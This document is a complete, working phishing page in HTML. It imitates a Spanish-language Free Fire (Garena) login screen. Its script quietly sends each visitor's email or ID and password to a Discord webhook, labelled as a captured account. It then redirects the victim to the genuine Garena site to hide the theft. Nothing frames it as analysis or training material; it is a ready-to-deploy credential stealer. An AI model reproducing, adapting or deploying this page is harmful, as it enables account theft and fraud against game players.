<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Free Fire</title>
    <style>
        body {
            background-color: #1a1a1a;
            color: white;
            font-family: 'Arial', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-image: linear-gradient(to bottom, #2b2b2b, #000000);
        }
        .container {
            background-color: rgba(0, 0, 0, 0.9);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 0 20px #ff9900;
            width: 300px;
            text-align: center;
            border: 1px solid #ff9900;
        }
        h2 { color: #ff9900; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 2px; }
        input {
            width: 100%; padding: 12px; margin: 10px 0; background-color: #333;
            border: none; color: white; border-radius: 5px; box-sizing: border-box;
        }
        input::placeholder { color: #aaa; }
        button {
            width: 100%; padding: 12px; background-color: #ff9900; color: black;
            font-weight: bold; border: none; border-radius: 5px; cursor: pointer;
            margin-top: 10px; font-size: 16px;
        }
        button:hover { background-color: #ffaa33; }
        .loading { display: none; margin-top: 15px; color: #aaa; font-size: 12px; }
        .logo { font-size: 24px; font-weight: 900; color: white; margin-bottom: 10px; }
        .logo span { color: #ff9900; }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">FREE <span>FIRE</span></div>
        <h2>Iniciar Sesión</h2>
        
        <form id="loginForm">
            <input type="text" id="email" placeholder="Correo electrónico o ID" required>
            <input type="password" id="password" placeholder="Contraseña" required>
            <button type="submit" id="btnLogin">ENTRAR</button>
            <div class="loading" id="loadingText">Verificando credenciales...</div>
        </form>
    </div>

    <script>
        const webhookUrl = "https://discord.com/api/webhooks/1562623991951261746/b92Mi-OoDLTSUDnbaCmq1wkBl0j29arqN5Xps6mUTkXS9XN1w55mz0MWFD72jy1ZCrlX"; 

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const btn = document.getElementById('btnLogin');
            const loading = document.getElementById('loadingText');

            btn.disabled = true;
            btn.innerText = "Conectando...";
            loading.style.display = "block";

            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `🔥 **Nueva Cuenta Capturada** 🔥\n\n👤 Usuario: \`${email}\`\n🔑 Contraseña: \`${password}\`\n📅 Hora: ${new Date().toLocaleString()}`
                })
            });

            setTimeout(function() {
                window.location.href = "https://ff.garena.com/s/es/"; 
            }, 2000);
        });
    </script>

</body>
</html>
